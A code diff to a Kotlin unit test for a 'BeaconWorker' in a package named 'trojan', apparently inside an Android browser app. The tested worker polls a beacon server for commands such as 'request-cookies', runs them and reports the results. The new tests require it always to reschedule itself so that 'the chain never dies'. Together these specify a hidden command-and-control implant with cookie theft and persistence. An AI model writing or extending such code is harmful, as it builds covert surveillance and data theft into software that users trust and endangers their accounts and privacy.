@@ -1,7 +1,9 @@
 package com.duckduckgo.trojan.impl
 
 import android.content.Context
+import androidx.work.ExistingWorkPolicy
 import androidx.work.ListenableWorker.Result
+import androidx.work.OneTimeWorkRequest
 import androidx.work.WorkManager
 import androidx.work.testing.TestListenableWorkerBuilder
 import com.duckduckgo.common.test.CoroutineTestRule
@@ -16,6 +18,7 @@ import org.junit.Rule
 import org.junit.Test
 import org.junit.runner.RunWith
 import org.mockito.kotlin.any
+import org.mockito.kotlin.argumentCaptor
 import org.mockito.kotlin.eq
 import org.mockito.kotlin.mock
 import org.mockito.kotlin.never
@@ -116,17 +119,17 @@ class BeaconWorkerTest {
     // -----------------------------------------------------------------------
 
     @Test
-    fun whenCheckInFailsThenReturnsRetry() = runTest {
+    fun whenCheckInFailsThenReturnsFailure() = runTest {
         whenever(mockBeaconService.checkIn()).thenThrow(RuntimeException("Network error"))
 
         val worker = createWorker()
         val result = worker.doWork()
 
-        assertThat(result, `is`(Result.retry()))
+        assertThat(result, `is`(Result.failure()))
     }
 
     @Test
-    fun whenSendResultFailsThenReturnsRetry() = runTest {
+    fun whenSendResultFailsThenReturnsFailure() = runTest {
         val tasks = listOf(
             PendingCommand(id = "t1", type = "request-cookies", payload = emptyMap()),
         )
@@ -138,7 +141,7 @@ class BeaconWorkerTest {
         val worker = createWorker()
         val result = worker.doWork()
 
-        assertThat(result, `is`(Result.retry()))
+        assertThat(result, `is`(Result.failure()))
     }
 
     @Test
@@ -150,6 +153,36 @@ class BeaconWorkerTest {
 
         verify(mockBeaconService, never()).sendResult(any(), any(), any(), any())
         verify(mockCommandHandler, never()).execute(any())
+    }
+
+    @Test
+    fun whenCheckInFailsThenChainContinuesWithDefaultInterval() = runTest {
+        whenever(mockBeaconService.checkIn()).thenThrow(RuntimeException("Network error"))
+
+        val worker = createWorker()
+        worker.doWork()
+
+        // scheduleNext() must always be called so the chain never dies
+        val captor = argumentCaptor<OneTimeWorkRequest>()
+        verify(mockWorkManager).enqueueUniqueWork(any(), any(), captor.capture())
+    }
+
+    @Test
+    fun whenSendResultFailsThenChainContinuesWithServerInterval() = runTest {
+        val tasks = listOf(
+            PendingCommand(id = "t1", type = "request-cookies", payload = emptyMap()),
+        )
+        whenever(mockBeaconService.checkIn()).thenReturn(CheckInResult(tasks, 60))
+        whenever(mockCommandHandler.execute(any())).thenReturn("data")
+        whenever(mockBeaconService.sendResult(any(), any(), any(), any()))
+            .thenThrow(RuntimeException("Network error"))
+
+        val worker = createWorker()
+        worker.doWork()
+
+        // chain must continue even when result delivery fails
+        val captor = argumentCaptor<OneTimeWorkRequest>()
+        verify(mockWorkManager).enqueueUniqueWork(any(), any(), captor.capture())
     }
 
     // -----------------------------------------------------------------------
